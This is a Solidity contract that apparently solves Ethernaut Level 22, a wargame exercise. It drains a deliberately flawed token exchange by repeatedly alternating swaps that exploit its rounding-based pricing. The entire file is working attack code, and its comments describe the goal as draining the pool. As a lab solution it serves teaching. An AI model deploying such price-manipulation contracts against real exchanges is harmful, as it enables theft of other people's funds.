// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
}

/**
 * @title DexExploit
 * @notice Ethernaut Level 22: Constant product AMM manipulation
 * @dev Drains DEX by exploiting price impact of large swaps
 */
contract DexExploit {
    IDex public target;
    
    constructor(address _target) {
        target = IDex(_target);
    }
    
    /**
     * @notice Execute multi-step swap attack to drain DEX
     * @dev Repeated swaps exploit the constant product formula:
     *      x * y = k, price = y/x
     *      Each swap changes the price, creating arbitrage
     */
    function attack() external {
        address token1 = target.token1();
        address token2 = target.token2();
        
        // Get initial liquidity
        uint256 balance1 = target.balanceOf(token1, address(target));
        uint256 balance2 = target.balanceOf(token2, address(target));
        
        // Approve max spending
        IERC20(token1).approve(address(target), type(uint256).max);
        IERC20(token2).approve(address(target), type(uint256).max);
        
        // Swap loop: alternate tokens, each swap improves our ratio
        // due to integer division rounding in getSwapPrice()
        for (uint256 i = 0; i < 6; i++) {
            uint256 myToken1 = IERC20(token1).balanceOf(address(this));
            uint256 myToken2 = IERC20(token2).balanceOf(address(this));
            
            if (myToken1 > 0) {
                uint256 swapAmount = myToken1 > balance1 ? balance1 : myToken1;
                target.swap(token1, token2, swapAmount);
            } else if (myToken2 > 0) {
                uint256 swapAmount = myToken2 > balance2 ? balance2 : myToken2;
                target.swap(token2, token1, swapAmount);
            }
            
            // Update balances after swap
            balance1 = target.balanceOf(token1, address(target));
            balance2 = target.balanceOf(token2, address(target));
        }
    }
}
